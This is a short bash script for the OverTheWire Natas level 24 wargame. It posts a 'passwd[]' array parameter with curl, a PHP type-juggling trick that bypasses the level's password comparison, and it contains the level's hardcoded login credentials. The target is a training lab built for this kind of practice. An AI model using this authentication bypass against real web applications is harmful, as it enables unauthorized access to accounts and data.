#!/usr/bin/env bash
curl -s http://natas24.natas.labs.overthewire.org \
    -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg \
    -d "passwd[]=$1" \
    -x localhost:8080 \
